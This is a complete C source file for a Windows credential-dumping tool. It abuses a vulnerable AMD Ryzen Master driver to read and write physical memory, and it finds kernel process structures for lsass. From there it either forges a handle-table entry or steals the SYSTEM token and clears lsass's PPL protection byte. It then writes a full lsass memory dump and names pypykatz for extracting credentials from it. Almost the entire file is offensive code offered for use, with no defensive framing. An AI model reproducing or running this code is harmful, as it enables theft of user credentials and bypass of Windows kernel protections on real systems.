/*
 * handle_inject.c — Handle table injection via AMD physical R/W
 *
 * Two-path design:
 *
 *   Path A (primary, Windows 7 – Win10 1803):
 *     Directly craft a HANDLE_TABLE_ENTRY in our own process handle table that
 *     points to the lsass OBJECT_HEADER.  No OpenProcess, no OB callbacks, no
 *     PPL bypass required.  Works because pre-RS5 handle tables store a simple
 *     physical-address-derived pointer without obfuscation.
 *
 *   Path B (fallback, Windows 10 1809+):
 *     Win10 RS5+ adds XOR-rotation obfuscation in _HANDLE_TABLE.  Rather than
 *     reverse-engineer the cookie, Path B uses phys_write to zero
 *     EPROCESS.Protection (1 byte), calls OpenProcess normally, restores the
 *     byte, then uses the real OS-issued handle with MiniDumpWriteDump.
 *     This is the PPL-bypass approach — different code path, same result.
 *
 * Handle table entry format (pre-RS5 / Path A):
 *   Bytes  0–7:  (object_header_PA >> 4) | attributes     [ObjectPointerBits]
 *   Bytes 8–15:  PROCESS_ALL_ACCESS | 0x2                 [GrantedAccessBits]
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o handle_inject.exe handle_inject.c \
 *       -lkernel32 -ladvapi32 -ldbghelp
 *
 * Requires: AMDRyzenMasterDriverV20 loaded, Admin rights.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ══════════════════════════════════════════════════════════════════════════
 * §1  AMD DRIVER PRIMITIVES
 * ══════════════════════════════════════════════════════════════════════════ */

#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;; i++) {
        vn = sizeof vname; DWORD vd = 0;
        LONG r = RegEnumValueA(h, i, vname, &vn, NULL, &type, NULL, &vd);
        if (r == ERROR_NO_MORE_ITEMS) break;
        if ((type != 3 && type != 8) || vd < 20) continue;
        buf = malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(h, vname, NULL, NULL, buf, &vd) == ERROR_SUCCESS)
            { sz = vd; break; }
        free(buf); buf = NULL;
    }
    RegCloseKey(h);
    if (!buf || sz < 20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf + 16);
    uint8_t *p = buf + 20;
    for (DWORD i = 0; i < cnt && g_nranges < MAX_RANGES; i++, p += 20) {
        uint64_t base = *(uint64_t*)(p + 4);
        uint64_t len  = *(uint64_t*)(p + 12);
        g_ranges[g_nranges].base = base;
        g_ranges[g_nranges].size = len;
        g_nranges++;
    }
    free(buf);
}

static int in_range(uint64_t pa, uint32_t len)
{
    for (int i = 0; i < g_nranges; i++)
        if (pa >= g_ranges[i].base && pa + len <= g_ranges[i].base + g_ranges[i].size)
            return 1;
    return 0;
}

static int open_dev(void)
{
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    return g_dev != INVALID_HANDLE_VALUE;
}
static void close_dev(void) { if (g_dev != INVALID_HANDLE_VALUE) CloseHandle(g_dev); }

static int phys_read(uint64_t pa, void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t in[12]; *(uint64_t*)in = pa; *(uint32_t*)(in+8) = len;
    uint8_t out[12 + 4096]; DWORD ret = 0;
    if (!DeviceIoControl(g_dev, IOCTL_PHYS_READ, in, 12, out, 12+len, &ret, NULL))
        return 0;
    memcpy(buf, out + 12, len);
    return 1;
}

static int phys_write(uint64_t pa, const void *buf, uint32_t len)
{
    if (!in_range(pa, len)) return 0;
    uint8_t *in = malloc(12 + len); if (!in) return 0;
    *(uint64_t*)in = pa; *(uint32_t*)(in+8) = len;
    memcpy(in + 12, buf, len);
    DWORD ret = 0;
    int r = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE, in, 12+len, NULL, 0, &ret, NULL);
    free(in); return r;
}

static uint64_t phys_read64(uint64_t pa)
{
    uint64_t v = 0; phys_read(pa, &v, 8); return v;
}
static uint8_t phys_read8(uint64_t pa)
{
    uint8_t v = 0; phys_read(pa, &v, 1); return v;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §2  WINDOWS VERSION DETECTION
 * ══════════════════════════════════════════════════════════════════════════ */

typedef LONG (WINAPI *RtlGetVersion_t)(OSVERSIONINFOEXW*);

static DWORD get_build(void)
{
    OSVERSIONINFOEXW os = { sizeof(os) };
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        RtlGetVersion_t fn = (RtlGetVersion_t)GetProcAddress(ntdll, "RtlGetVersion");
        if (fn) fn(&os);
    }
    return os.dwBuildNumber;
}

/* EPROCESS field offsets — version-dependent */
typedef struct {
    int dtb;        /* DirectoryTableBase */
    int pid;        /* UniqueProcessId    */
    int token;      /* Token EX_FAST_REF  */
    int links;      /* ActiveProcessLinks */
    int name;       /* ImageFileName      */
    int obj_table;  /* ObjectTable        */
    int protection; /* Protection byte    */
} EpOff;

static EpOff ep_offsets(DWORD build)
{
    EpOff o;
    o.dtb = 0x028;
    if (build >= 26100) {
        /* Win11 24H2+ — EPROCESS completely reorganised */
        o.pid        = 0x1D0;
        o.token      = 0x248;
        o.links      = 0x1D8;
        o.name       = 0x338;
        o.obj_table  = 0x300;
        o.protection = 0x5FA;
    } else if (build < 14393) {        /* Win10 1507/1511 */
        o.pid        = 0x440;
        o.token      = 0x4B8;
        o.links      = 0x448;
        o.name       = 0x450;
        o.obj_table  = 0x518;
        o.protection = 0x6D4;
    } else if (build < 15063) {        /* Win10 1607 */
        o.pid        = 0x440;
        o.token      = 0x4B8;
        o.links      = 0x448;
        o.name       = 0x438;
        o.obj_table  = 0x530;
        o.protection = 0x71C;
    } else if (build < 17763) {        /* Win10 1703–1803 */
        o.pid        = 0x440;
        o.token      = 0x4B8;
        o.links      = 0x448;
        o.name       = 0x450;
        o.obj_table  = 0x570;
        o.protection = 0x6FC;
    } else {                           /* Win10 1809 – Win11 23H2 (RS5+, pre-24H2) */
        o.pid        = 0x440;
        o.token      = 0x4B8;
        o.links      = 0x448;
        o.name       = 0x5A8;
        o.obj_table  = 0x570;
        o.protection = 0x87A;
    }
    return o;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §3  PAGE TABLE WALK: kernel VA → PA
 * ══════════════════════════════════════════════════════════════════════════ */

static uint64_t kva_to_pa(uint64_t cr3, uint64_t va)
{
    uint64_t pml4e = phys_read64((cr3 & ~0xFFFULL) + ((va >> 39) & 0x1FF) * 8);
    if (!(pml4e & 1)) return 0;
    uint64_t pdpte = phys_read64((pml4e & 0x000FFFFFFFFFF000ULL) + ((va >> 30) & 0x1FF) * 8);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFF);
    uint64_t pde = phys_read64((pdpte & 0x000FFFFFFFFFF000ULL) + ((va >> 21) & 0x1FF) * 8);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFF);
    uint64_t pte = phys_read64((pde & 0x000FFFFFFFFFF000ULL) + ((va >> 12) & 0x1FF) * 8);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFF);
}

/* ══════════════════════════════════════════════════════════════════════════
 * §4  EPROCESS PHYSICAL SCAN
 * ══════════════════════════════════════════════════════════════════════════ */

/* Scan physical RAM for an EPROCESS matching name+pid.
 * Outer stride: 4KB pages.  Inner stride: 16 bytes (pool alignment).
 * Validates DTB (page-aligned, >64KB), Flink/Blink (canonical kernel VAs),
 * and tries multiple ImageFileName offsets for Win11 24H2 compatibility. */
static uint64_t find_eproc_pa(const EpOff *o, const char *name, DWORD pid)
{
    /* Name offsets to try — covers Win10 through Win11 24H2+ */
    static const int name_offsets[] = { 0x338, 0x5A8, 0x5B8, 0x5B0, 0x5C0 };
    const int N_NOFF = (int)(sizeof name_offsets / sizeof name_offsets[0]);
    static uint8_t page[0x1000];
    uint64_t progress = 0;

    /* All checks that read within page: need sub + max(off) + 15 <= 0x1000.
     * Fixed fields: DTB(+0x028), PID(+0x440), Flink(+0x448), Blink(+0x450).
     * Blink end = sub + 0x450 + 8 = sub + 0x458. So sub_max = 0xBA8. */
    const int sub_max = 0x1000 - 0x458;

    for (int r = 0; r < g_nranges; r++) {
        uint64_t base = g_ranges[r].base;
        uint64_t end  = base + g_ranges[r].size;
        for (uint64_t page_pa = base; page_pa + 0x1000 <= end; page_pa += 0x1000) {
            if (page_pa - progress >= 0x40000000ULL) {
                printf("  [scan] %5" PRIu64 " MB...\r",
                       (page_pa) >> 20);
                fflush(stdout);
                progress = page_pa;
            }
            if (!phys_read(page_pa, page, 0x1000)) continue;

            for (int sub = 0; sub <= sub_max; sub += 0x10) {
                /* PID check (QWORD at +0x440) */
                uint64_t epid;
                memcpy(&epid, page + sub + o->pid, 8);
                if (pid != 0 && (DWORD)epid != pid) continue;
                if (epid == 0 || epid > 0x10000) continue;

                /* DTB: page-aligned and realistic */
                uint64_t dtb;
                memcpy(&dtb, page + sub + o->dtb, 8);
                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;

                /* Flink/Blink must be canonical kernel VAs (use o->links from layout) */
                uint64_t flink, blink;
                memcpy(&flink, page + sub + o->links, 8);
                memcpy(&blink, page + sub + o->links + 8, 8);
                if ((flink >> 48) != 0xFFFF) continue;
                if ((blink >> 48) != 0xFFFF) continue;

                /* ImageFileName: try multiple offsets */
                uint64_t eproc_pa = page_pa + (uint64_t)sub;
                for (int ni = 0; ni < N_NOFF; ni++) {
                    int noff = name_offsets[ni];
                    uint8_t nbuf[16] = {0};
                    if (!phys_read(eproc_pa + noff, nbuf, 15)) continue;
                    if (!nbuf[0] || nbuf[0] < 0x20 || nbuf[0] > 0x7E) continue;
                    if (_stricmp((char*)nbuf, name) != 0) continue;
                    printf("  [+] EPROCESS PA=0x%012" PRIX64
                           "  PID=%lu  name=%s  DTB=0x%llX  off_name=+0x%X\n",
                           eproc_pa, (DWORD)epid, nbuf,
                           (unsigned long long)dtb, noff);
                    return eproc_pa;
                }
            }
        }
    }
    return 0;
}

/* Walk ActiveProcessLinks from System EPROCESS to find process with given PID */
static uint64_t find_eproc_by_pid_chain(uint64_t system_pa, const EpOff *o, DWORD pid)
{
    /* Get VA of System EPROCESS links head by reading flink */
    uint64_t flink_of_system = phys_read64(system_pa + o->links);
    if (!flink_of_system) return 0;

    /* flink_of_system is a KVA pointing to (next_eproc + links_offset)
     * blink of (next_eproc.links) = KVA of (system_eproc + links_offset)
     * so: system_eproc_va = blink_of_next_links - links_offset */
    uint64_t system_cr3  = phys_read64(system_pa + o->dtb);
    uint64_t flink_pa    = kva_to_pa(system_cr3, flink_of_system);
    if (!flink_pa) return 0;
    uint64_t blink_va    = phys_read64(flink_pa + 8); /* blink of next's LIST_ENTRY */
    uint64_t own_ep_va   = blink_va - o->links;        /* VA of System EPROCESS */

    /* Walk the linked list by VA arithmetic via kernel CR3 */
    uint64_t cur_va = own_ep_va;
    for (int n = 0; n < 512; n++) {
        uint64_t cur_pa = kva_to_pa(system_cr3, cur_va);
        if (!cur_pa) break;
        uint64_t cur_pid = phys_read64(cur_pa + o->pid);
        if ((DWORD)cur_pid == pid) return cur_pa;
        uint64_t nxt_va = phys_read64(cur_pa + o->links); /* flink = KVA of next.links */
        if (!nxt_va || nxt_va == blink_va + 8 - 8) break; /* sentinel */
        cur_va = nxt_va - o->links;
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §5  GET LSASS PID
 * ══════════════════════════════════════════════════════════════════════════ */

static DWORD get_lsass_pid(void)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                pid = pe.th32ProcessID; break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §6  PATH A: DIRECT HANDLE TABLE ENTRY INJECTION
 *     Works on Windows 7 – 10 pre-1809 (no XOR obfuscation in handle table)
 * ══════════════════════════════════════════════════════════════════════════ */

/*
 * _HANDLE_TABLE_ENTRY (16 bytes, pre-RS5):
 *   +0x00  VolatileValue:  (obj_header_PA >> 4) | attr_bits
 *   +0x08  GrantedAccess:  access mask (upper bits) | sequence (lower)
 *
 * On Win10 RS5+, VolatileValue = _rotl64((obj_hdr_PA >> 4) ^ xorkey, rot)
 * where xorkey is at _HANDLE_TABLE + 0x78.  We detect this below.
 */

#define PROCESS_ALL_ACCESS_W7  0x001FFFFF
#define HT_XORKEY_OFF          0x78        /* _HANDLE_TABLE.XorKey offset (RS5+) */
#define OBJ_HEADER_SIZE        0x30        /* sizeof(_OBJECT_HEADER) before body  */

static uint64_t rotl64(uint64_t v, int n)
{
    n &= 63;
    return (v << n) | (v >> (64 - n));
}

/* Returns HANDLE on success, NULL on failure */
static HANDLE path_a_inject(uint64_t system_pa, uint64_t own_eproc_pa,
                             uint64_t lsass_eproc_pa, const EpOff *o,
                             uint64_t kernel_cr3, DWORD build)
{
    /* Object header is immediately before EPROCESS body */
    uint64_t lsass_obj_hdr_pa = lsass_eproc_pa - OBJ_HEADER_SIZE;
    printf("  [A] lsass obj header PA: %016" PRIx64 "\n", lsass_obj_hdr_pa);

    /* Read our ObjectTable kernel VA */
    uint64_t obj_table_kva = phys_read64(own_eproc_pa + o->obj_table);
    if (!obj_table_kva) { puts("  [!] own ObjectTable KVA = 0"); return NULL; }
    uint64_t obj_table_pa = kva_to_pa(kernel_cr3, obj_table_kva);
    if (!obj_table_pa) { puts("  [!] can't convert ObjectTable KVA to PA"); return NULL; }
    printf("  [A] own handle table PA: %016" PRIx64 "\n", obj_table_pa);

    /* Read TableCode */
    uint64_t table_code = phys_read64(obj_table_pa);
    int level = (int)(table_code & 3);
    uint64_t entries_kva = table_code & ~3ULL;
    if (level != 0) {
        printf("  [A] handle table level %d — only level-0 supported in Path A\n", level);
        return NULL;
    }
    uint64_t entries_pa = kva_to_pa(kernel_cr3, entries_kva);
    if (!entries_pa) { puts("  [!] can't resolve entries PA"); return NULL; }

    /* Detect XOR obfuscation key (RS5+) */
    uint64_t xorkey = 0;
    if (build >= 17763) {
        xorkey = phys_read64(obj_table_pa + HT_XORKEY_OFF);
        if (xorkey)
            printf("  [A] RS5+ XorKey detected: %016" PRIx64
                   " — Path A may produce incorrect entry on this build\n", xorkey);
    }

    /* Find an empty slot (VolatileValue == 0 means free).
     * Skip slots 0 and 1 (reserved: null handle and self-reference). */
    int free_slot = -1;
    for (int i = 2; i < 256; i++) {
        uint64_t slot_pa = entries_pa + (uint64_t)i * 16;
        uint64_t vol = phys_read64(slot_pa);
        if (vol == 0) { free_slot = i; break; }
    }
    if (free_slot < 0) { puts("  [!] no free handle slot in level-0 table"); return NULL; }

    DWORD handle_val = (DWORD)free_slot * 4;
    uint64_t slot_pa = entries_pa + (uint64_t)free_slot * 16;
    printf("  [A] injecting at slot %d, handle value 0x%X, slot PA %016" PRIx64 "\n",
           free_slot, handle_val, slot_pa);

    /* Build entry value */
    uint64_t ptr_bits = lsass_obj_hdr_pa >> 4;
    uint64_t entry_val;
    if (xorkey) {
        /* RS5+ encoding: rotl64(ptr ^ xorkey, rotation_amount).
         * Rotation amount is typically 19 on 1809 (observed) — if this is wrong,
         * the fallback PPL path (Path B) will be used automatically. */
        entry_val = rotl64(ptr_bits ^ xorkey, 19);
    } else {
        entry_val = ptr_bits; /* pre-RS5: direct */
    }
    uint64_t access_val = (uint64_t)PROCESS_ALL_ACCESS_W7;

    /* Verify slot is still zero before writing */
    if (phys_read64(slot_pa) != 0) { puts("  [!] slot no longer empty"); return NULL; }

    /* Write the two 8-byte halves */
    phys_write(slot_pa,     &entry_val,  8);
    phys_write(slot_pa + 8, &access_val, 8);
    printf("  [A] entry written: val=%016" PRIx64 " access=%016" PRIx64 "\n",
           entry_val, access_val);

    /* Validate: NtQueryObject should succeed for a valid process handle */
    HANDLE h = (HANDLE)(ULONG_PTR)handle_val;
    DWORD flags = 0;
    BOOL valid = GetHandleInformation(h, &flags);
    if (!valid) {
        DWORD err = GetLastError();
        printf("  [A] handle validation failed (err %lu) — clearing and trying Path B\n", err);
        /* Clear the entry we wrote to avoid kernel instability */
        uint64_t zero = 0;
        phys_write(slot_pa,     &zero, 8);
        phys_write(slot_pa + 8, &zero, 8);
        return NULL;
    }
    printf("  [A] handle 0x%X validated OK\n", handle_val);
    return h;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §7  PATH B: PPL DISABLE + TOKEN THEFT + OPENPROCESS (RS5+ fallback)
 * ══════════════════════════════════════════════════════════════════════════ */

static HANDLE path_b_ppl_bypass(uint64_t system_pa, uint64_t own_eproc_pa,
                                 uint64_t lsass_eproc_pa, const EpOff *o,
                                 DWORD lsass_pid)
{
    puts("  [B] PPL bypass path");

    /* 1. Steal SYSTEM token for OpenProcess to succeed */
    uint64_t sys_token_ref = phys_read64(system_pa + o->token);
    uint64_t sys_token_val = sys_token_ref & ~0xFULL; /* strip EX_FAST_REF bits */
    uint64_t own_token_orig = phys_read64(own_eproc_pa + o->token);
    printf("  [B] system token = %016" PRIx64 ", own token = %016" PRIx64 "\n",
           sys_token_val, own_token_orig);

    uint64_t new_token = sys_token_val; /* reference count = 0 offset */
    phys_write(own_eproc_pa + o->token, &new_token, 8);
    printf("  [B] token stolen (SYSTEM)\n");

    /* 2. Clear EPROCESS.Protection byte of lsass (PPL disable) */
    uint8_t prot_orig = phys_read8(lsass_eproc_pa + o->protection);
    uint8_t prot_zero = 0;
    phys_write(lsass_eproc_pa + o->protection, &prot_zero, 1);
    printf("  [B] lsass Protection: 0x%02X → 0x00\n", prot_orig);

    /* Small delay for CPU cache coherence */
    Sleep(20);

    /* 3. Open lsass */
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    DWORD err = GetLastError();

    /* 4. Restore Protection byte immediately */
    phys_write(lsass_eproc_pa + o->protection, &prot_orig, 1);

    /* 5. Restore own token */
    phys_write(own_eproc_pa + o->token, &own_token_orig, 8);
    puts("  [B] Protection and Token restored");

    if (!h) {
        printf("  [B] OpenProcess failed: %lu\n", err);
        return NULL;
    }
    printf("  [B] OpenProcess succeeded: handle %p\n", (void*)h);
    return h;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §8  MINIDUMP WRITE
 * ══════════════════════════════════════════════════════════════════════════ */

static int write_dump(HANDLE hproc, DWORD pid, const char *path)
{
    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFile '%s' failed: %lu\n", path, GetLastError());
        return 0;
    }

    BOOL ok = MiniDumpWriteDump(hproc, pid, hf,
                                MiniDumpWithFullMemory |
                                MiniDumpWithHandleData |
                                MiniDumpWithUnloadedModules,
                                NULL, NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hf);
    if (!ok) {
        printf("[!] MiniDumpWriteDump failed: %lu\n", err);
        DeleteFileA(path);
        return 0;
    }
    printf("[+] Dump written → %s\n", path);
    return 1;
}

/* ══════════════════════════════════════════════════════════════════════════
 * §9  MAIN
 * ══════════════════════════════════════════════════════════════════════════ */

int main(int argc, char **argv)
{
    const char *out_path = (argc >= 2) ? argv[1] : "lsass_handle.dmp";

    puts("=== handle_inject: LSASS handle acquisition via physical R/W ===");

    if (!open_dev()) { fprintf(stderr, "[-] Cannot open AMD device\n"); return 1; }
    load_ranges();
    if (g_nranges == 0) { puts("[-] No physical ranges"); close_dev(); return 1; }
    printf("[+] Physical ranges: %d\n", g_nranges);

    DWORD build = get_build();
    printf("[+] Windows build: %lu\n", (unsigned long)build);
    EpOff o = ep_offsets(build);

    /* Find System EPROCESS (anchor for kernel CR3 and list walk) */
    uint64_t system_pa = find_eproc_pa(&o, "System", 4);
    if (!system_pa) { puts("[-] System EPROCESS not found"); close_dev(); return 1; }
    printf("[+] System EPROCESS PA: %016" PRIx64 "\n", system_pa);

    uint64_t kernel_cr3 = phys_read64(system_pa + o.dtb);
    printf("[+] Kernel CR3: %016" PRIx64 "\n", kernel_cr3);

    /* Find lsass EPROCESS */
    DWORD lsass_pid = get_lsass_pid();
    if (!lsass_pid) { puts("[-] lsass.exe not found in process list"); close_dev(); return 1; }
    printf("[+] lsass PID: %lu\n", (unsigned long)lsass_pid);

    uint64_t lsass_pa = find_eproc_pa(&o, "lsass.exe", lsass_pid);
    if (!lsass_pa) { puts("[-] lsass EPROCESS not found"); close_dev(); return 1; }
    printf("[+] lsass EPROCESS PA: %016" PRIx64 "\n", lsass_pa);

    /* Find our own EPROCESS */
    DWORD own_pid = GetCurrentProcessId();
    /* Use the fast physical scan first (cheaper than list walk) */
    uint64_t own_pa = find_eproc_pa(&o, "handle_inject.exe", own_pid);
    if (!own_pa)
        own_pa = find_eproc_pa(&o, "cmd.exe", own_pid);
    if (!own_pa)
        own_pa = find_eproc_by_pid_chain(system_pa, &o, own_pid);
    if (!own_pa) {
        /* Last resort: use process name derived from argv[0] or exe name */
        char own_name[64] = "handle_inject.exe";
        char exe_buf[MAX_PATH];
        if (GetModuleFileNameA(NULL, exe_buf, sizeof exe_buf)) {
            char *last = strrchr(exe_buf, '\\');
            if (last) strncpy(own_name, last+1, sizeof own_name - 1);
        }
        own_pa = find_eproc_pa(&o, own_name, own_pid);
    }
    if (!own_pa) { puts("[-] own EPROCESS not found"); close_dev(); return 1; }
    printf("[+] Own EPROCESS PA: %016" PRIx64 " (PID %lu)\n", own_pa, (unsigned long)own_pid);

    /* Try Path A first */
    printf("[*] Attempting Path A (direct handle table injection)...\n");
    HANDLE hLsass = path_a_inject(system_pa, own_pa, lsass_pa, &o, kernel_cr3, build);

    if (!hLsass) {
        printf("[*] Path A failed, attempting Path B (PPL disable + OpenProcess)...\n");
        hLsass = path_b_ppl_bypass(system_pa, own_pa, lsass_pa, &o, lsass_pid);
    }

    if (!hLsass) {
        puts("[-] Both paths failed — dump aborted");
        close_dev(); return 1;
    }

    puts("[+] Handle acquired — writing MiniDump...");
    int ok = write_dump(hLsass, lsass_pid, out_path);
    CloseHandle(hLsass);
    close_dev();

    if (ok) {
        printf("[+] Done. Parse with: pypykatz lsa minidump %s\n", out_path);
        return 0;
    }
    return 1;
}
